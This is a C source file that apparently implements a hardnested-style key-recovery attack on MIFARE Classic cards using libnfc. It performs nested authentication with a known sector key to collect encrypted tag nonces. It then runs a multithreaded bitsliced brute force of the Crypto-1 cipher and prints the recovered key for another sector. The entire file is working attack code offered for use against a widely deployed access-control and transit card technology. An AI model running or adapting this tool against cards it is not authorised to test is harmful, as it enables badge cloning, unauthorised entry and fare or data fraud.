// Almost entirely based on code from Mifare Offline Cracker (MFOC) by Nethema, cheers guys! :)

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/sysinfo.h>
#include <nfc/nfc.h>

#include "crypto1_bs_crack.h"

extern uint64_t * crypto1_create(uint64_t key);
extern uint32_t crypto1_word(uint64_t *, uint32_t, int);
extern uint8_t crypto1_byte(uint64_t*, uint8_t, int);
extern uint32_t prng_successor(uint32_t x, uint32_t n);
extern void crypto1_destroy(uint64_t*);

#define MC_AUTH_A 0x60
#define MC_AUTH_B 0x61

nfc_device* pnd;
nfc_target target;
typedef uint8_t byte_t;

uint8_t oddparity(const uint8_t bt)
{
  // cf http://graphics.stanford.edu/~seander/bithacks.html#ParityParallel
  return (0x9669 >> ((bt ^(bt >> 4)) & 0xF)) & 1;
}


long long unsigned int bytes_to_num(uint8_t *src, uint32_t len)
{
    uint64_t num = 0;
    while (len--) {
        num = (num << 8) | (*src);
        src++;
    }
    return num;
}


static nfc_context *context;

#define MAX_FRAME_LEN 264

uint64_t *nonces = NULL;
size_t nonces_collected;

void nested_auth(uint32_t uid, uint64_t known_key, uint8_t ab_key, uint8_t for_block, uint8_t target_block, uint8_t target_key, FILE* fp)
{
    uint64_t *pcs;

    // Possible key counter, just continue with a previous "session"
    uint8_t Nr[4] = { 0x00, 0x00, 0x00, 0x00 }; // Reader nonce
    uint8_t Cmd[4] = { 0x00, 0x00, 0x00, 0x00 };

    uint8_t ArEnc[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t ArEncPar[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    uint8_t Rx[MAX_FRAME_LEN]; // Tag response
    uint8_t RxPar[MAX_FRAME_LEN]; // Tag response

    uint32_t Nt;

    int i;

    // Prepare AUTH command
    Cmd[0] = ab_key;
    Cmd[1] = for_block;
    iso14443a_crc_append(Cmd, 2);

    // We need full control over the CRC
    if (nfc_device_set_property_bool(pnd, NP_HANDLE_CRC, false) < 0)  {
        nfc_perror(pnd, "nfc_device_set_property_bool crc");
        return;
    }

    // Request plain tag-nonce
    // TODO: Set NP_EASY_FRAMING option only once if possible
    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, false) < 0) {
        nfc_perror(pnd, "nfc_device_set_property_bool framing");
        return;
    }

    if (nfc_initiator_transceive_bytes(pnd, Cmd, 4, Rx, sizeof(Rx), 0) < 0) {
        fprintf(stdout, "Error while requesting plain tag-nonce\n");
        return;
    }

    if (nfc_device_set_property_bool(pnd, NP_EASY_FRAMING, true) < 0) {
        nfc_perror(pnd, "nfc_device_set_property_bool");
        return;
    }

    // Save the tag nonce (Nt)
    Nt = bytes_to_num(Rx, 4);

    // Init the cipher with key {0..47} bits
    pcs = crypto1_create(known_key);

    // Load (plain) uid^nt into the cipher {48..79} bits
    crypto1_word(pcs, bytes_to_num(Rx, 4) ^ uid, 0);

    // Generate (encrypted) nr+parity by loading it into the cipher
    for (i = 0; i < 4; i++) {
        // Load in, and encrypt the reader nonce (Nr)
        ArEnc[i] = crypto1_byte(pcs, Nr[i], 0) ^ Nr[i];
        ArEncPar[i] = filter(*pcs) ^ oddparity(Nr[i]);
    }

    // Skip 32 bits in the pseudo random generator
    Nt = prng_successor(Nt, 32);

    // Generate reader-answer from tag-nonce
    for (i = 4; i < 8; i++) {
        // Get the next random byte
        Nt = prng_successor(Nt, 8);
        // Encrypt the reader-answer (Nt' = suc2(Nt))
        ArEnc[i] = crypto1_byte(pcs, 0x00, 0) ^(Nt & 0xff);
        ArEncPar[i] = filter(*pcs) ^ oddparity(Nt);
    }

    // Finally we want to send arbitrary parity bits
    if (nfc_device_set_property_bool(pnd, NP_HANDLE_PARITY, false) < 0) {
        nfc_perror(pnd, "nfc_device_set_property_bool parity");
        return;
    }

    // Transmit reader-answer
    int res;
    if (((res = nfc_initiator_transceive_bits(pnd, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
        printf("Reader-answer transfer error, exiting..");
        return;
    }

    // Decrypt the tag answer and verify that suc3(Nt) is At
    Nt = prng_successor(Nt, 32);

    if (!((crypto1_word(pcs, 0x00, 0) ^ bytes_to_num(Rx, 4)) == (Nt & 0xFFFFFFFF))) {
        printf("[At] is not Suc3(Nt), something is wrong, exiting..");
        return;
    }

    Cmd[0] = target_key;
    Cmd[1] = target_block;
    iso14443a_crc_append(Cmd, 2);

    for (i = 0; i < 4; i++) {
        ArEnc[i] = crypto1_byte(pcs, 0, 0) ^ Cmd[i];
        ArEncPar[i] = filter(*pcs) ^ oddparity(Cmd[i]);
    }
    if (((res = nfc_initiator_transceive_bits(pnd, ArEnc, 32, ArEncPar, Rx, sizeof(Rx), RxPar)) < 0) || (res != 32)) {
        printf("Reader-answer transfer error, exiting..");
        return;
    }

    if(fp){
        for(i = 0; i < 4; i++){
            fprintf(fp,"%02x", Rx[i]);
            if(RxPar[i] != oddparity(Rx[i])){
                fprintf(fp,"! ");
            } else {
                fprintf(fp,"  ");
            }
        }
        fprintf(fp, "\n");
    }
    if(nonces){
        nonces[nonces_collected] = 0;
        for(i = 0; i < 4; i++){
            nonces[nonces_collected] |= ((uint64_t) Rx[i]) << (8*i);
            bool parity = (RxPar[i] != oddparity(Rx[i])) ^ parity(Rx[i]);
            nonces[nonces_collected] |= ((uint64_t) parity) << (32 + (8*i));
        }
        nonces_collected++;
    }

    crypto1_destroy(pcs);
}

uint32_t uid;
uint32_t **space;
size_t thread_count;
size_t total_states;
void* crack_states_thread(void* x){
    const size_t thread_id = (size_t)x;
    int j;
    for(j = thread_id; space[j * 5]; j += thread_count) {
        const uint64_t key = crack_states_bitsliced(space + j * 5);
        if(key != -1){
            printf("Found key: %012"PRIx64"\n", key);
            __sync_fetch_and_add(&keys_found, 1);
            break;
        } else if(keys_found){
            break;
        } else {
            printf("Cracking... %6.02f%%\n", (100.0*total_states_tested/(total_states)));
        }
    }
    return NULL;
}

void have_enough_states(int sig){
    if(nonces && uid){
        space = craptev1_get_space(nonces, 95, uid);
    }
    if(!space){
        printf("\rCollected %zu nonces... ", nonces_collected);
    } else {
        total_states = craptev1_sizeof_space(space);
        printf("\rCollected %zu nonces... leftover complexity %zu (press any key to start brute-force phase)", nonces_collected, total_states);
    }
    fflush(stdout);
    signal(SIGALRM, have_enough_states);
    alarm(1);
}

int main (int argc, const char * argv[]) {
    nfc_init(&context);
    pnd = nfc_open(context, NULL);

    if (pnd == NULL) {
        printf("No NFC device connection\n");
        return 1;
    }

    nfc_initiator_init(pnd);

    nfc_device_set_property_bool(pnd,NP_ACTIVATE_FIELD,false);
    // Let the reader only try once to find a tag
    nfc_device_set_property_bool(pnd,NP_INFINITE_SELECT,false);
    nfc_device_set_property_bool(pnd,NP_HANDLE_CRC,true);
    nfc_device_set_property_bool(pnd,NP_HANDLE_PARITY,true);

    const nfc_modulation nmMifare = {
        .nmt = NMT_ISO14443A,
        .nbr = NBR_106,
    };

    uid = 0;

    // Enable field so more power consuming cards can power themselves up
    nfc_device_set_property_bool(pnd,NP_ACTIVATE_FIELD,true);
    if (nfc_initiator_select_passive_target(pnd,nmMifare,NULL,0,&target)) {
        uid = bytes_to_num(target.nti.nai.abtUid,target.nti.nai.szUidLen);
    }

    if(!uid){
        // Disconnect from NFC device
        nfc_close(pnd);
    }

    if(argc < 4){
        printf("%s <known key> <for block> <A|B> <target block> <A|B>\n", argv[0]);
    }

    uint64_t known_key = strtoul(argv[1], 0, 16);
    uint8_t for_block = atoi(argv[2]);
    uint8_t ab_key = MC_AUTH_A;
    if(argv[3][0] == 'b' || argv[3][0] == 'B'){
       ab_key = MC_AUTH_B;
    }
    uint8_t target_block = atoi(argv[4]);
    uint8_t target_key = MC_AUTH_A;
    if(argv[5][0] == 'b' || argv[5][0] == 'B'){
       target_key = MC_AUTH_B;
    }
    
    char filename[20];
    sprintf(filename, "0x%04x_%03u.txt", uid, target_block);
    FILE* fp = fopen(filename, "wb");

    printf("Found tag with uid %04x, collecting nonces for key %s of block %u using known key %s %012"PRIx64" for block %u\n", uid, target_key == MC_AUTH_A ? "A" : "B", target_block, ab_key == MC_AUTH_A ? "A" : "B", known_key, for_block);
    nonces_collected = 0;
    nonces = malloc(sizeof (uint64_t) <<  24);
    memset(nonces, 0xff, sizeof (uint64_t) <<  24);
    signal(SIGALRM, have_enough_states);
    alarm(1);

    fcntl(0, F_SETFL, O_NONBLOCK);

    while(true){
        // Configure the CRC and Parity settings
        nfc_device_set_property_bool(pnd,NP_HANDLE_CRC,true);
        nfc_device_set_property_bool(pnd,NP_HANDLE_PARITY,true);
        // Poll for a ISO14443A (MIFARE) tag
        if (nfc_initiator_select_passive_target(pnd,nmMifare,NULL,0,&target)) {
            nested_auth(bytes_to_num(target.nti.nai.abtUid, 4), known_key, ab_key, for_block, target_block, target_key, fp);
        } else {
            printf("Don't move the tag!\n");
        }
        if(space){
            char c;
            if(read(0, &c, 1) == 1 || total_states < 0x1000000000){
                alarm(0);
                break;
            }
        }
    }

    fclose(fp);

    if(!space){
        return 1;
    }

    thread_count = get_nprocs_conf();
    pthread_t threads[thread_count];

    size_t i;

    printf(" - initializing BS crypto-1...\n");
    crypto1_bs_init();
    printf("Using %u-bit bitslices\n", MAX_BITSLICES);

    uint8_t rollback_byte = **space;
    printf("Bitslicing rollback byte: %02x...\n", rollback_byte);
    // convert to 32 bit little-endian
    crypto1_bs_bitslice_value32(rev32((rollback_byte)), bitsliced_rollback_byte, 8);

    printf("Bitslicing nonces...\n");
    for(size_t tests = 0; tests < NONCE_TESTS; tests++){
        // pre-xor the uid into the decrypted nonces, and also pre-xor the uid parity into the encrypted parity bits - otherwise an exta xor is required in the decryption routine
        uint32_t test_nonce = uid^rev32(nonces[tests]);
        uint32_t test_parity = (nonces[tests]>>32)^rev32(uid);
        test_parity = ((parity(test_parity >> 24 & 0xff) & 1) | (parity(test_parity>>16 & 0xff) & 1)<<1 | (parity(test_parity>>8 & 0xff) & 1)<<2 | (parity(test_parity & 0xff) & 1) << 3);
        crypto1_bs_bitslice_value32(test_nonce, bitsliced_encrypted_nonces[tests], 32);
        // convert to 32 bit little-endian
        crypto1_bs_bitslice_value32(~(test_parity)<<24, bitsliced_encrypted_parity_bits[tests], 4);
    }

    total_states_tested = 0;
    keys_found = 0;

    printf("Starting %zu threads to test %zu states\n", thread_count, total_states);
    for(i = 0; i < thread_count; i++){
        pthread_create(&threads[i], NULL, crack_states_thread, (void*) i);
    }
    for(i = 0; i < thread_count; i++){
        pthread_join(threads[i], 0);
    }
    printf("Tested %zu states\n", total_states_tested);

    craptev1_destroy_space(space);
    return 0;
}
